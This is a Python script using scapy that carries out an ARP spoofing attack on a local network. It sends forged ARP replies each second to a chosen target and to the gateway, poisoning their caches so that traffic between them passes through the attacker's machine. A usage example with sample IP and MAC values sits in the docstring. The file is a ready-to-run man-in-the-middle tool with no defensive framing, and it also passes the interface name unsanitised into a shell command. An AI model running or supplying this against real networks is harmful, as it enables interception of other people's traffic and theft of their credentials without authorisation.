
"""
example:
python assets/arpspoof.py --target_ip 192.168.1.145 --target_mac 52:db:a3:6b:f0:c4 --gateway_ip 192.168.1.1 --gateway_mac 20:b0:01:15:c3:4f --interface Wi-Fi
"""


from scapy.all import send, ARP
import sys
import time
import argparse
import os

def spoof(target_ip, target_mac, spoof_ip):
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet = arp
    send(packet, verbose=False, iface=INTERFACE)

parser = argparse.ArgumentParser(description="ARP Spoofing")
parser.add_argument("--target_ip", type=str, help="Target IP address", required=True)
parser.add_argument("--target_mac", type=str, help="Target MAC address", required=True)
parser.add_argument("--gateway_ip", type=str, help="Gateway IP address", required=True)
parser.add_argument("--gateway_mac", type=str, help="Gateway MAC address", required=True)
parser.add_argument("--interface", type=str, help="Network interface name", default="Wi-Fi")
parser.add_argument("--log", type=str, help="0/1 for log", default="0")
args = parser.parse_args()

INTERFACE = args.interface


def main():
    LOG_ENABLE = int(args.log)
    TARGET_IP = args.target_ip
    TARGET_MAC = args.target_mac
    GATEWAY_IP = args.gateway_ip
    GATEWAY_MAC = args.gateway_mac
    SUBNET_MASK = os.popen(f'netsh interface ip show config name="{INTERFACE}" | findstr /i "Subnet"').read().split()[-1][:-1]

    print(f"Interface: {INTERFACE}")
    print(f"Target IP: {TARGET_IP}")
    print(f"Target MAC: {TARGET_MAC}")
    print(f"Gateway IP: {GATEWAY_IP}")
    print(f"Gateway MAC: {GATEWAY_MAC}")
    print(f"Subnet Mask: {SUBNET_MASK}")
    try:

        # os.system(f'netsh interface ip set address name="{INTERFACE}" static {TARGET_IP} {SUBNET_MASK} {GATEWAY_IP}')
        # os.system(f'netsh interface ip set address name="{INTERFACE}" gateway={GATEWAY_IP} {SUBNET_MASK}')

        while True:
            spoof(TARGET_IP, TARGET_MAC, GATEWAY_IP)
            spoof(GATEWAY_IP, GATEWAY_MAC, TARGET_IP)
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit(0)
    
if __name__ == '__main__':
    main()